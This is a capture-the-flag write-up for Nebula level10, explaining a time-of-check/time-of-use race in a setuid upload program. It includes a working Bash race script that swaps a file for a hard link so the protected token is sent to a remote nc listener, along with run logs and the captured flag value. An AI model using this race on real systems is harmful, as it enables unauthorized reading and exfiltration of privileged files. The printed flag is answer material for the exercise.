# For level10 in nebula

> The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
>  
> To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.

We are given the source code below. It is very overwhelming, so we will digest it piece by piece.

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

### Gathering clues

There is a file called `x` in `/home/level10`. When we print it, it shows a lot of empty lines surrounding a string.Using `strings`, we can ignore the newline characters. I'm not sure what purpose it serves, but we'll find out.
```
level10@nebula:~$ ls
x
level10@nebula:~$ file x
x: ASCII text
level10@nebula:~$ strings x
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

In the directory `/home/flag10`, we have 2 files. `flag10` is the program, the source code of which was provided to us. I suppose the goal of this level is to upload the file `token` to somewhere and read it. I could be wrong. Afterall, it's just a guess.
```
level10@nebula:/home/flag10$ ls -l
total 9
-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
```

> The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. [...] This allows set-user-ID programs and capability-endowed programs to easily determine the invoking user's authority. In other words, access() does not answer the "can I read/write/execute this file?" question. It answers a slightly different question: "(assuming I'm a setuid binary) can the user who invoked me read/write/execute this file?", which gives set-user-ID programs the possibility to prevent malicious users from causing them to read files which users shouldn't be able to read.
[source](https://www.mankier.com/2/access)

It might be tempting to jump to the conclusion that because `flag10` is a SETUID program, it should be able to access `token` and upload it. The man pages of the C function `access` show that EUID is *not* used to check for file access. We may be able to `open` and `read` the file `token` as our EID is `flag10`, but it doesn't matter anyway because we fail the `access` check.
```
level10@nebula:/home/flag10$ ./flag10 token 192.168.1.20
You don't have access to token
```
In other words, the program only allows us to upload files that we have access to as `level10`. Right. Let's try uploading our file `/home/level10/x` to another computer. The recipient computer will be listening on port 18211. The program chooses that particular port.
This is the output from our nebula machine showing that the file `x` has been successfully written to the recipient.
```
level10@nebula:/home/flag10$ ./flag10 ~/x 192.168.1.11
Connecting to 192.168.1.11:18211 .. Connected!
Sending file .. wrote file!
```

This is the recipient that has successfully received the contents of `x` from the nebula machine.
```
$ nc -l 18211
.oO Oo.
[...]
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
[...]
```

Interestingly, there is a section in the man pages of `access` labelled "Bugs". Since the clues emphasise so much on `access`, this information *may* come in handy.
> In kernel 2.4 (and earlier) there is some strangeness in the handling of X_OK tests for superuser. If all categories of execute permission are disabled for a nondirectory file, then the only access() test that returns -1 is when mode is specified as just X_OK; if R_OK or W_OK is also specified in mode, then access() returns 0 for such files. Early 2.6 kernels (up to and including 2.6.3) also behaved in the same way as kernel 2.4.
>  
> In kernels before 2.6.20, these calls ignored the effect of the MS_NOEXEC flag if it was used to mount(2) the underlying filesystem. Since kernel 2.6.20, the MS_NOEXEC flag is honored.

However, they do not apply to the system here as the kernel version that Nebula is using is more updated.
```
level10@nebula:/home/flag10$ uname -r
3.0.0-12-generic
```

How then, shall we print the output of `token`? I noticed another possible clue in the "Notes" section of the `access` man pages.
> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

I did not understand what this note meant, but it sounded like a huuuuuge clue. I found a question on stackexchange, the answer to which clarified what the warning above means.

> It is a race condition. You do the access(), then you do the open(). In the small time between the two calls, the file may have changed. Typically, the file is, say, /tmp/foo. Initially, the file is owned by some user (who is the bad guy of the story), and the target is some root-powered application. The application does the access(), sees that the file really belongs to the user, and thus thinks: "that's fine, it's his file, I can process it on his behalf". Then the bad guy quickly replaces the file with a symbolic link to /etc/shadow. The application has already taken the decision to open /tmp/foo, but when it does, it really opens and processes /etc/shadow.
[source](https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole)

Perhaps here we could create a fake `/home/level10/token` to trick `access` into letting us upload the program, then replace it with a link that points to `/home/flag10/token` for upload instead.

### Winning script

I wrote a Bash script that calls the SETUID program `flag10` in the background. The `access` function grants us access to upload our fake `/home/level10/token`. Before the `open` function opens the file for uploading, `rm /home/level10/token && ln /home/flag10/token /home/level10/token &` replaces the fake `/home/level10/token` with the link that points to `/home/flag10/token`. 
```
#!/bin/bash

if [ -f "/home/level10/token" ]
then
	rm -f /home/level10/token
fi

touch /home/level10/token && echo "Fake token" > /home/level10/token

/home/flag10/flag10 /home/level10/token 192.168.1.111 &
rm /home/level10/token && ln /home/flag10/token /home/level10/token &
```

This is the ideal output. The recipient machine successfully receives the token `'615a2ce1-b2b5-4c76-8eed-8aa5c4015c27'`.
```
level10@nebula:~$ ls
test.sh  x
level10@nebula:~$ touch token
level10@nebula:~$ bash test.sh 
level10@nebula:~$ Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. wrote file!
```
```
$ nc -l 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
$
```

That is how we win the challenge.

By the way, I say it is ideal because it should *ideally* happen every time we run the script. However, that is *not* the case. In reality, that does not always happen.

### A little dose of reality

> Race conditions have a reputation of being difficult to reproduce and debug, since the end result is nondeterministic and depends on the relative timing between interfering threads. Problems occurring in production systems can therefore disappear when running in debug mode, when additional logging is added, or when attaching a debugger, often referred to as a "Heisenbug". 
[source](https://en.wikipedia.org/wiki/Race_condition)

When we run the script `test.sh`, more often than not, the contents of `/home/flag10/token` won't be sent for various reasons. As you can see in the output below, out of a 100 times the script was run, the contents of flag10's token was successfully sent only once (in the 3rd attempt). The nondeterministic nature of race conditions means that it is impossible that our script will work all the time.
```
solomonbstoner@swjsUbuntu:~$ for i in {0..100}; do nc -l 18211; done; 
.oO Oo.
.oO Oo.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
```
```
level10@nebula:~$ for i in {0..100}; do ./test.sh; done;
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. touch: Connected!
Sending file .. wrote file!
cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
ln: creating hard link `/home/level10/token': File exists
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
ln: Connecting to 192.168.1.111:18211 .. creating hard link `/home/level10/token': File exists
Connected!
Sending file .. Damn. Unable to open file
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
ln: creating hard link `/home/level10/token': File exists
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
rm: cannot remove `/home/level10/token': No such file or directory
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
rm: cannot remove `/home/level10/token': No such file or directory
Connecting to 192.168.1.111:18211 .. Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
Unable to connect to host 192.168.1.111
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
rm: cannot remove `/home/level10/token': No such file or directory
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
rm: cannot remove `/home/level10/token': No such file or directory
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
ln: creating hard link `/home/level10/token'Connecting to 192.168.1.111:18211 .. : File exists
Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
ln: Connecting to 192.168.1.111:18211 .. creating hard link `/home/level10/token': File exists
Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
ln: creating hard link `/home/level10/token'Connecting to 192.168.1.111:18211 .. : File exists
Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
Connecting to 192.168.1.111:18211 .. Connected!
Sending file .. Damn. Unable to open file
touch: You don't have access to /home/level10/token
cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
You don't have access to /home/level10/token
touch: cannot touch `/home/level10/token': Permission denied
level10@nebula:~$
```

Here are some possible explanations for some of the errors above:
1. `You don't have access to /home/level10/token` occured because the file was either deleted and not yet created, or the link to flag10's token file was created before the function `access` was called.
2. `Sending file .. Damn. Unable to open file` occured as the fake token file passed the `access` check, but just as the program called the function `open`, the script deleted the fake token file, and the link to flag10's token had not yet been created.
3. `touch: cannot touch '/home/level10/token': Permission denied` & `ln: creating hard link '/home/level10/token'Connecting to 192.168.1.111:18211 .. : File exists` probably occured as the background processes are fighting with each other over the files which are shared amongst them.


### Dumb failed attempts

Before I managed to solve the level, I desparately tried several other (dumb) methods. I will record them here just for laughs.

1. Using `ln` to bypass the permissions. It worked in level04, so I *assumed* it would work here. Obviously it would not. `ln` only allowed us to bypass the check in level04 where the program ensured the name was not "token". As the output below shows, `ln` changes neither the owner nor the permissions.
```
level10@nebula:/home/flag10$ ln token ~/tok
level10@nebula:/home/flag10$ cat ~/tok 
cat: /home/level10/tok: Permission denied
level10@nebula:/home/flag10$ ls -l ~
total 5
-rw------- 2 flag10  flag10   37 2011-11-20 21:22 tok
-rw-rw-r-- 1 level10 level10 382 2012-08-19 18:27 x
```

2. Trying to create a tarball archive. That way, after we extract the file, it will belong to `level10`.

> When extracting an archive, do not attempt to preserve the owner specified in the tar archive. This the default behavior for ordinary users. 
[source](https://www.gnu.org/software/tar/manual/tar.html#SEC137)

```
level10@nebula:/home/flag10$ tar cf ~/token token 
tar: token: Cannot open: Permission denied
tar: Exiting with failure status due to previous errors
```

3. We tried a hard link in point 1, and it failed. So I thought we could use a symbolic link instead. Afterall, the owner of the symbolic link is `level10`, so it should pass the `access` test. I failed to realise the important point below under the "Notes" section of the `access` man pages.

> access() always dereferences symbolic links. If you need to check the permissions on a symbolic link, use faccessat() with the flag AT_SYMLINK_NOFOLLOW.
 
```
level10@nebula:/home/flag10$ ln -s token ~/tok
level10@nebula:/home/flag10$ ls -l ~
total 1
lrwxrwxrwx 1 level10 level10   5 2018-04-02 09:58 tok -> token
-rw-rw-r-- 1 level10 level10 382 2012-08-19 18:27 x
level10@nebula:/home/flag10$ ./flag10 ~/tok 192.168.1.111
You don't have access to /home/level10/tok
```

END
